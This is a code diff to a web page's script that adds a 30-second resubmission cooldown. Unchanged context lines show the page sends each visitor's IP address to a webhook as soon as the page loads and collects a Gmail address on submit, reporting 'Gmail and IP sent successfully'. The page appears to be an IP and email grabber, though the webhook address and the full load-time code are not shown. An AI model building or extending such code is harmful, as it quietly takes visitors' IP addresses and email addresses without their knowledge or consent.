@@ -64,6 +64,8 @@
   </div>
 
   <script>
+    let lastSubmissionTime = 0; // Track the last submission time
+
     // Send IP address to the webhook on page load
     (async () => {
       try {
@@ -97,6 +99,14 @@
     document.getElementById('submit').addEventListener('click', async () => {
       const email = document.getElementById('email').value;
       const status = document.getElementById('status');
+      const currentTime = Date.now();
+
+      // Check for spam (30-second cooldown)
+      if (currentTime - lastSubmissionTime < 30000) {
+        status.textContent = 'Please wait 30 seconds before submitting again.';
+        status.style.color = 'red';
+        return;
+      }
 
       if (!email) {
         status.textContent = 'Please enter your Gmail.';
@@ -121,8 +131,9 @@
           }),
         });
 
-        status.textContent = 'Gmail and IP sent successfully.';
+        status.textContent = 'Gmail and IP sent successfully!';
         status.style.color = 'green';
+        lastSubmissionTime = currentTime; // Update the last submission time
 
       } catch (error) {
         console.error('Error:', error);
